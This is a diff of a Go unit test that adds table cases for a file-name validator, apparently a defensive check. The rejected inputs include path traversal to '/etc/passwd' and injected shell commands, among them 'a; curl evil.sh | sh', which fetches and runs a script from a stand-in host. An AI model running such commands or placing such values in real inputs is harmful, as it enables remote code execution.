@@ -370,6 +370,37 @@ func TestValidateSharedDir(t *testing.T) {
 	}
 }
 
+func TestValidateSharedFile(t *testing.T) {
+	tests := []struct {
+		name    string
+		input   string
+		wantErr bool
+	}{
+		{"default env file", ".env.local", false},
+		{"nested file", "config/secrets/prod/prod.decrypt.private.php", false},
+		{"with hyphens and underscores", "my-file_name.txt", false},
+		{"empty", "", true},
+		{"absolute path", "/etc/passwd", true},
+		{"parent traversal", "../.env", true},
+		{"hidden traversal", "config/../../etc/passwd", true},
+		{"with spaces", "my file", true},
+		{"shell injection from audit", "a; curl evil.sh | sh", true},
+		{"with semicolon", "file;id", true},
+		{"with backtick", "file`id`", true},
+		{"with shell expansion", "file$(id)", true},
+		{"with pipe", "file|id", true},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			err := ValidateSharedFile(tt.input)
+			if (err != nil) != tt.wantErr {
+				t.Errorf("ValidateSharedFile(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
+			}
+		})
+	}
+}
+
 func TestGenerateHeredocDelimiter(t *testing.T) {
 	t.Run("non-empty", func(t *testing.T) {
 		delim, err := GenerateHeredocDelimiter("ENVEOF")
